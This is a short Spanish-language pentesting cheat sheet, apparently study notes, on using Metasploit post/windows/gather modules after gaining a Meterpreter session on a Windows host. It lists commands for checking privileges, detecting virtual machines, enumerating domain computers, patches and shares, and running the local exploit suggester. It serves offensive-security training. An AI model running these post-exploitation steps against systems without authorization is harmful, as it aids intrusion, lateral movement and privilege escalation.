# Windows – Automating Local Enumeration con Metasploit

Cuando se obtiene acceso a una máquina Windows mediante **Meterpreter**, es importante **automatizar la recolección de información** del sistema. Metasploit incluye múltiples módulos `post/windows/gather/*` para simplificar esta tarea.

---

## 1. Preparación
1. Ganas acceso con **Meterpreter**.  
2. Envías la sesión al **background**:
```bash
meterpreter > background
```
3. Ver sesiones activas:
```bash
msf6 > sessions -i
```

---

## 2. Comprobar privilegios del usuario
```bash
use post/windows/gather/win_privs
set SESSION 1
run
```
- Lista privilegios del usuario actual.
- Útil para detectar si el usuario puede **escalar privilegios** (ej. `SeImpersonatePrivilege`).

---

## 3. Detectar si es una máquina virtual
```bash
use post/windows/gather/checkvm
set SESSION 1
run
```
- Detecta si la víctima está en **VMware, VirtualBox, Hyper-V**, etc.
- Puede ayudar a identificar entornos de laboratorio.

---

## 4. Enumerar equipos del dominio/red
```bash
use post/windows/gather/enum_computers
set SESSION 1
run
```
- Enumera **otros equipos accesibles** desde la máquina comprometida.
- Muy útil para **pivoting** y moverse lateralmente.

---

## 5. Enumerar parches aplicados
```bash
use post/windows/gather/enum_patches
set SESSION 1
run
```
- Identifica **parches instalados o faltantes** en la víctima.
- Permite cruzar con exploits conocidos para escalar privilegios.

---

## 6. Enumerar recursos compartidos
```bash
use post/windows/gather/enum_shares
set SESSION 1
run
```
- Lista carpetas compartidas (ej. `C$`, `ADMIN$`).
- Puede revelar información sensible o accesos administrativos.

---

## 7. Módulo para buscar exploits locales
```bash
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```
- Analiza la configuración y versión de Windows.
- Sugiere posibles **exploits locales** para escalada de privilegios.

